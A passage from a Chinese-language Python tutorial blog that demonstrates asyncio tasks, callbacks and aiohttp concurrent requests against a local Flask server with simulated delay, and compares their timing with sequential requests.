D:/python/实战项目/Coroutine3.py:<span class="number">3</span>&gt;&gt;</span><br><span class="line">Number: <span class="number">1</span></span><br><span class="line">Task &lt;Task finished coro=&lt;execute() done, defined at D:/python/实战项目/Coroutine3.py:<span class="number">3</span>&gt; result=<span class="number">1</span>&gt;</span><br><span class="line">After calling loop</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="绑定回调"><a href="#绑定回调" class="headerlink" title="绑定回调"></a>绑定回调</h4><ol>
<li><p>通过调用 add_done_callback() 为task对象绑定一个回调方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span>  <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'https://www.baidu.com'</span></span><br><span class="line">    status = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> status</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">callback</span><span class="params">(task)</span>:</span></span><br><span class="line">    print(<span class="string">'Status:'</span>,task.result())</span><br><span class="line"> </span><br><span class="line">coroutine = Request()</span><br><span class="line">task = asyncio.ensure_future(coroutine)</span><br><span class="line">task.add_done_callback(callback)   <span class="comment">#绑定回调函数</span></span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Task: &lt;Task pending coro=&lt;Request() running at D:</span><br><span class="line">Status: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task: &lt;Task finished coro=&lt;Request() done, defined at D:/python/实战项目/Coroutine4.py:<span class="number">4</span>&gt; result=&lt;Response [<span class="number">200</span>]&gt;&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>不用回调方法，直接在 task 运行完毕之后也可以直接调用 result() 方法获取结果</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'https://www.baidu.com'</span></span><br><span class="line">    status = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> status</span><br><span class="line"> </span><br><span class="line">coroutline  = Request()</span><br><span class="line">task = asyncio.ensure_future(coroutline)</span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(task)</span><br><span class="line">print(<span class="string">'Task:'</span>,task)</span><br><span class="line">print(<span class="string">'Task Result:'</span>,task.result())</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Task: &lt;Task pending coro=&lt;Request() running at D:</span><br><span class="line">Status: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task: &lt;Task finished coro=&lt;Request() done, defined at D:/python/实战项目/Coroutine4.py:<span class="number">4</span>&gt; result=&lt;Response [<span class="number">200</span>]&gt;&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="多任务协程（通过task列表来实现，调用asncio-wait-方法执行）"><a href="#多任务协程（通过task列表来实现，调用asncio-wait-方法执行）" class="headerlink" title="多任务协程（通过task列表来实现，调用asncio.wait()方法执行）"></a>多任务协程（通过task列表来实现，调用asncio.wait()方法执行）</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'https://www.baidu.com'</span></span><br><span class="line">    status = requests.get(url)</span><br><span class="line">    <span class="keyword">return</span> status</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]  <span class="comment">#利用for循环创建5个task</span></span><br><span class="line">print(<span class="string">'Tasks:'</span>,tasks)</span><br><span class="line"> </span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))   <span class="comment">#asyncio.wait(tasks)将task列表注入到loop循环事件中</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> task <span class="keyword">in</span> tasks:</span><br><span class="line">    print(<span class="string">'Task Request:'</span>,task.result())</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Tasks: [&lt;Task pending coro=&lt;Request() running at D:/python/实战项目/Coroutine6.py:<span class="number">4</span>&gt;&gt;, &lt;Task pending coro=&lt;Request() running at D:</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br><span class="line">Task Request: &lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure>
<h4 id="协程实现"><a href="#协程实现" class="headerlink" title="协程实现"></a>协程实现</h4><blockquote>
<p>以上是对协程基本的定义使用，并没有进行异步处理的操作，这里用flask模拟网络请求有延迟的情况，然后进行挂起，异步的操作。</p>
</blockquote>
<ol>
<li><p>利用flask编写模拟有网络延迟的服务器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">3</span>)      <span class="comment">#表示请求这个接口要延时3秒显示结果，模拟延迟的网络</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello!'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(threaded = <span class="keyword">True</span>)  <span class="comment">#threaded = True表示在服务器开启了多线程模式，如果不开启，服务端是单线程模式，如果还是异步I/O请求的方式，依旧要排队等待依次执行。</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1541731526.07.png" alt></p>
</li>
<li><p>通过协程的方式来请求生成的模拟服务端页面</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    response = requests.get(url)</span><br><span class="line">    print(<span class="string">'Get response from '</span>, url, <span class="string">'Result: '</span>, response.text)</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"> </span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Cost time: <span class="number">15.040287971496582</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过协程的方式请求页面发现还是在依次执行，时间为15s，效率并没有提高，原因是：协程提高效率的最大 特点是异步协程，重点是要能够异步请求，就需要程序可以将阻塞的协程挂起，让出控制权，执行其他协程。在python3.5及以后通过await实现挂起的操作，当loop循环事件遇到await是就执行协程挂起。</p>
</li>
<li><p>根据第三点的提出的特点，我们要实现挂起的是请求页面的操作，所以这里将请求页面的方法做一个修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    response = <span class="keyword">await</span> requests.get(url)</span><br><span class="line">    print(<span class="string">'Get response from '</span>, url, <span class="string">'Result: '</span>, response.text)</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"> </span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Cost time: <span class="number">15.033875942230225</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"D:/python/实战项目/Coroutine8.py"</span>, line <span class="number">10</span>, <span class="keyword">in</span> Request</span><br><span class="line">    response = <span class="keyword">await</span> requests.get(url)</span><br><span class="line">TypeError: object Response can<span class="string">'t be used in '</span><span class="keyword">await</span><span class="string">' expression</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过运行结果来看，不能这样修改，Waiting for http这里确实是挂起了，但是await后面的对象不对，因为await后面必须跟一个原生 coroutine 对象或者一个由 types.coroutine() 修饰的生成器，这个生成器可以返回 coroutine 对象，而requests.get的生成的对象是：<class 'requests.models.response'>，所以不符合</class></p>
</li>
<li><p>所以考虑将请求页面的方法单独封装，实现生成coroutine 对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> requests.get(url)</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    response = <span class="keyword">await</span> get(url)</span><br><span class="line">    print(<span class="string">'Get response from '</span>, url, <span class="string">'Result: '</span>, response.text)</span><br><span class="line"> </span><br><span class="line">tasks = [asyncio.ensure_future(Request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"> </span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#运行结果：</span></span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">Get response <span class="keyword">from</span>  http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result:  Hello!</span><br><span class="line">Cost time: <span class="number">15.035670042037964</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过运行结果来看，将I/O操作的代码封装到 async 修饰的方法里面是不可行，无法实现异步请求，所以必须使用支持异步请求的方法来实现，这里使用<strong>aiohttp</strong>(时间缩短为原来的1/5，效率大大提高)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#不要为每次的连接都创建一次session,一般情况下只需要创建一个session，然后使用这个session执行所有的请求。</span></span><br><span class="line"><span class="comment">#每个session对象，内部包含了一个连接池，并且将会保持连接和连接复用（默认开启）可以加快整体的性能。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"> <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">       session = aiohttp.ClientSession()</span><br><span class="line">       response = <span class="keyword">await</span> session.get(url)</span><br><span class="line">       result = <span class="keyword">await</span> response.text()</span><br><span class="line">       <span class="keyword">await</span> session.close()           </span><br><span class="line">       <span class="comment">#这里的await是必须的，因为session的请求会话出现了可挂起的选项，如果close不可以挂起，会出现阻塞的状态导致报错</span></span><br><span class="line">       <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">   <span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">()</span>:</span></span><br><span class="line">       url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">       print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">       result = <span class="keyword">await</span> get(url)</span><br><span class="line">       print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"></span><br><span class="line">   tasks = [asyncio.ensure_future(request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">5</span>)]</span><br><span class="line">   loop = asyncio.get_event_loop()</span><br><span class="line">   loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line">   end = time.time()</span><br><span class="line">   print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"><span class="comment"># 运行结果：</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">3.0310966968536377</span></span><br><span class="line"><span class="comment"># 修改await session.close()为session.close()的报错执行结果</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">3.012549638748169</span></span><br><span class="line">   D:/python/Conoutine10.py:<span class="number">12</span>: RuntimeWarning: coroutine <span class="string">'ClientSession.close'</span> was never        session.close()</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9D68</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9EF0</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9F28</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9F98</span>&gt;</span><br><span class="line">   Unclosed client session</span><br><span class="line">   client_session: &lt;aiohttp.client.ClientSession object at <span class="number">0x0000022C36EC9F60</span>&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>通过几次代码的修改，我们成功的实现了真正的异步协程。开始运行时，时间循环会运行第一个 task，针对第一个 task 来说，当执行到第一个 await 跟着的 get() 方法时，它被挂起，但这个 get() 方法第一步的执行是非阻塞的，挂起之后立马被唤醒，所以立即又进入执行，创建了 ClientSession 对象，接着遇到了第二个 await，调用了 session.get() 请求方法，然后就被挂起了，由于请求需要耗时很久，所以一直没有被唤醒，好第一个 task 被挂起了，那接下来该怎么办呢？事件循环会寻找当前未被挂起的协程继续执行，于是就转而执行第二个 task 了，也是一样的流程操作，直到执行了第五个 task 的 session.get() 方法之后，全部的 task 都被挂起了。所有 task 都已经处于挂起状态，那咋办？只好等待了。3 秒之后，几个请求几乎同时都有了响应，然后几个 task 也被唤醒接着执行，输出请求结果，最后耗时，3 秒！这里对应这我们模拟服务端设置的延时3秒。</p>
</li>
<li><p>根据上面显示的结果来看，5个task在3s之内都是挂起的等待的，同理，在3s之内CPU处理的task数量肯定会比5个（取决于CPU，我这里改成1000就会报错）；所以就意味着在CPU允许的范围之内处理多少task的时间都是3s（前提是服务段抗压性好，能正确对每次请求做出正确的返回）。将5改为300来测试：task数量提高了60倍，处理时间还是3s，可以看到协程的优点；多出来的部分时间是IO 传输时延</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">start = time.time()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url)</span>:</span></span><br><span class="line">    session = aiohttp.ClientSession()</span><br><span class="line">    response = <span class="keyword">await</span> session.get(url)</span><br><span class="line">    result = <span class="keyword">await</span> response.text()</span><br><span class="line">    <span class="keyword">await</span>  session.close()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    result = <span class="keyword">await</span> get(url)</span><br><span class="line">    print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasks = [asyncio.ensure_future(request()) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">300</span>)]</span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br><span class="line"></span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="与单进程、多进程、多线程的对比"><a href="#与单进程、多进程、多线程的对比" class="headerlink" title="与单进程、多进程、多线程的对比"></a>与单进程、多进程、多线程的对比</h3><ol>
<li><p>单进程，单线程：(以10次请求为例)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">start = time.time()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Request</span><span class="params">()</span>:</span></span><br><span class="line">	url = <span class="string">'http://127.0.0.1:5000'</span></span><br><span class="line">    print(<span class="string">'Waiting for'</span>,url)</span><br><span class="line">    result = requests.get(url).text</span><br><span class="line">    print(<span class="string">'Get response from'</span>,url,<span class="string">'Result:'</span>,result)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    Request()</span><br><span class="line">end = time.time()</span><br><span class="line">print(<span class="string">'Cost time:'</span>,end - start)</span><br><span class="line"><span class="comment"># 运行结果：</span></span><br><span class="line"></span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Waiting <span class="keyword">for</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span></span><br><span class="line">   Get response <span class="keyword">from</span> http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">5000</span> Result: Hello!</span><br><span class="line">   Cost time: <span class="number">30.057233095169067</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>多进程(以10次请求为例)</p>
